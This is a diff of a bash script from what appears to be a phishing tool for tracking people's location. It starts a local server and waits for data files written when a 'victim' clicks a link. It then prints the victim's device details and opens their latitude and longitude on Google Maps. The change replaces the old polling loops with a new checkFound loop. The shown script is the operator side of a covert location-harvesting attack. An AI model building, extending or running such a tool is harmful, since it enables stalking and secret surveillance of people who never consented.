@@ -34,7 +34,7 @@ S4="\033[1;34m" B4="\033[1;44m"
 S5="\033[1;35m" B5="\033[1;45m"
 S6="\033[1;36m" B6="\033[1;46m"
 S7="\033[1;37m" B7="\033[1;47m"
-R0="\033[0;00m"
+R0="\033[0;00m" SB="\033[5;32m" #green blink
 #<<<=========Internet check=========>>>
 ping -c 1 google.com >/dev/null 2>&1
 if [ "$?" != '0' ]; then
@@ -90,24 +90,41 @@ printf "\n${S4}Username to login ${S1}:: ${S2}Your Name :)${R0}\n"
 printf "${S4}Password to login ${S1}:: ${S2}dearsuman${R0}\n"
 xdg-open http://127.0.0.1:8084
 #<<<---Get location--->>>#
-while true; do
-    if [ -z $(cat $CWD/assets/send/php/info.txt) ]; then
-        sleep 0.3
-    else
-        cat $CWD/assets/send/php/info.txt | jq 
-        break
-    fi
-done
-while true; do
-    if [ -z $(cat $CWD/assets/send/php/result.txt) ]; then
-        sleep 0.3
-    else
-        latitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lat)
-        longitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lon)
-        break
-    fi
-done
-xdg-open "https://maps.google.com/maps?q=${latitude},${longitude}"
-printf "\n\n${S7}[${S4}+${S7}] ${S2}Location ${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n\n\n"
-printf "${S6}Variation if victim clicked again:-${R0}\n\n"
-tail -f $CWD/assets/send/php/result.txt
+#while true; do
+#    if [ -z $(cat $CWD/assets/send/php/info.txt) ]; then
+#        sleep 0.3
+#    else
+#        cat $CWD/assets/send/php/info.txt | jq 
+#        break
+#    fi
+#done
+#while true; do
+#    if [ -z $(cat $CWD/assets/send/php/result.txt) ]; then
+#        sleep 0.3
+#    else
+#        latitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lat)
+#        longitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lon)
+#        break
+#    fi
+#done
+#xdg-open "https://maps.google.com/maps?q=${latitude},${longitude}"
+#printf "\n\n${S7}[${S4}+${S7}] ${S2}Location ${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n\n\n"
+#printf "${S6}Variation if victim clicked again:-${R0}\n\n"
+#tail -f $CWD/assets/send/php/result.txt
+#<<<new version output>>># for testing...
+checkFound() {
+    printf "\n${SB}WATING FOR RESPOSNSES!!${R0}\n"
+    while [ true ]; do
+        if [[ -e $CWD/assets/send/php/info.txt ]]; then
+            printf "\n${S2}Victim Clicked on the link ;)!!${R0}\n"
+            cat  $CWD/assets/send/php/info.txt | jq
+        fi
+        if [[ -e $CWD/assets/send/php/result.txt ]]; then
+            latitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lat)
+            longitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lon)
+            xdg-open "https://maps.google.com/maps?q=${latitude},${longitude}"
+            printf "\n\n${S7}[${S4}+${S7}] ${S2}Location ${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n\n\n"
+        fi
+    done
+}
+checkFound
